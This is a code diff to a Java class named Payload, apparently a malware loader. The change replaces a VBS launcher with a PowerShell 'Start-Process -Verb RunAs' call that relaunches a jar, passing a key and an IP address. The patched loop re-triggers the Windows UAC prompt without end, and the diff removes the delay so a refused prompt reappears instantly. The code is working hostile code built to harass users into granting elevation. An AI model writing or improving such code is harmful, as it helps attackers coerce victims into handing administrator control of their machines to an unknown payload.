@@ -153,22 +153,20 @@ public class Payload {
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            // Create VBS file to trigger UAC instantly without PowerShell overhead
-            File vbsFile = new File(getLoaderDir(), "uac.vbs");
-            String vbsContent = "Set objShell = CreateObject(\"Shell.Application\")\r\n" +
-                "objShell.ShellExecute \"" + javaExe.replace("\\", "\\\\") + "\", \"-jar \"\"" + jarPath.replace("\\", "\\\\") + "\"\" " + key + " " + ip + "\", \"\", \"runas\", 1\r\n";
-            Files.write(vbsFile.toPath(), vbsContent.getBytes());
+            String psCommand = String.format(
+                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
+                javaExe, jarPath, key, ip
+            );
 
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
                 log("Triggering UAC...");
                 
-                // Execute wscript.exe (loads instantly)
-                Process p = new ProcessBuilder("wscript.exe", vbsFile.getAbsolutePath()).start();
+                Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-Command", psCommand).start();
                 p.waitFor(); 
                 
-                // Check every 15ms if the prompt was accepted
+                // Spin-check every 15ms
                 boolean accepted = false;
                 for (int i = 0; i < 400; i++) { 
                     if (!lockFile.exists() || lockFile.delete()) {
@@ -181,12 +179,9 @@ public class Payload {
                 if (accepted) {
                     log("UAC Accepted. Parent exiting.");
                     lockStream.close();
-                    vbsFile.delete();
                     System.exit(0); 
                 } else {
-                    // Wait exactly 6 seconds to let Windows lift its internal UAC lock
-                    log("UAC Denied. Waiting 6s for Windows lock to lift...");
-                    Thread.sleep(6000);
+                    log("UAC Denied. Retrying instantly...");
                 }
             }
         } catch (Exception e) {
